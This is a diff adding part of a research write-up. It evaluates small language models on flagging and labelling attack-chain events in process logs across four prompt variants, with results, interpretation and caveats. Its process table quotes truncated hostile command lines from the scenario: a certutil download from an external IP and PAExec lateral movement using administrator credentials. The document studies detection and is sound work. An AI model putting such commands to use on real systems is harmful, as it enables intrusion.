+| └─ certutil.exe (PID 3268): "certutil  -urlcache -split -f http://124. | flagged |
+| └─ agent.exe (PID 4128): "C:\Users\Public\agent.exe  -opid 7fa51253-c0 | flagged |
+| └─ PAExec.exe (PID 2196): "PAExec.exe  \\192.168.0.95 -u administrator | flagged |
+| chrome.exe (PID 3820): ""C:\Program Files\Google\Chrome\Application\ch | flagged |
+| smss.exe (PID 3204): "\SystemRoot\System32\smss.exe 00000000 00000050  | flagged |
+| taskhost.exe (PID 616): "taskhost.exe "  [x3] | dropped |
+
+**Reading the examples above:**
+- In the v3 run, the `sangforcat.exe` download flips from Initial Access (v2, correct) to Command and Control -- the MITRE-convention effect described under v3. In v4 it is correct again, and the `sethc.exe` persistence step is also labeled correctly.
+- The same v3 output contains a fabricated C2 address, `124.224.153.87` (the evidence has `124.223.85.207`), and its narrative invents a "Chrome extension" delivery vector and "phishing". This is a concrete case of what the hallucination-rate metric catches (the IP) and what it cannot (invented narrative claims).
+- Triage flags the whole attack chain, but also benign processes such as `smss.exe` and the Chrome root process, consistent with the models flagging over half of all processes. It is a recall-safe but blunt filter.
+
+### What the four variants show together
+
+1. **The only significant improvements came from changing what the model is given, never from changing how it reasons.** v3 (stage vocabulary) significantly improved stage recall; v4 (less irrelevant input) improved precision. Across 48 within-variant topology tests, one reached p < 0.05 (v2, Llama, stage recall, GoT > CoT, p = 0.02). That is about what chance alone produces at this many tests (48 x 0.05 = 2.4 expected), and it did not replicate in v3 or v4.
+2. **Detection remains the bottleneck.** Even in v4, 79% of real attack events are never flagged. Neither better labels nor a smaller input moved detection much (15.3% -> 21.3% across all four variants).
+3. **Cumulative effect v1 -> v4:** event F1 0.227 -> 0.325, exact stage recall 0.043 -> 0.147, and events both detected and correctly labeled 3.1% -> 7.4% of all ground-truth events.
+
+### Caveats
+
+- One dataset (5 scenarios, 3 of which share one log), two 7-8B models, 3 seeds.
+- v1 -> v2 mixes in a hardware change (RTX 6000 Ada -> A100); v2 -> v3 and v3 -> v4 are like-for-like.
+- Many paired tests are reported; only v3's stage-recall gain survives multiple-comparison correction.
+- v4's 8 remaining parse failures are all Llama GoT Refine-step failures. The parser falls back to the pre-Refine state, so those runs still carry 18-29 events and are scored normally.
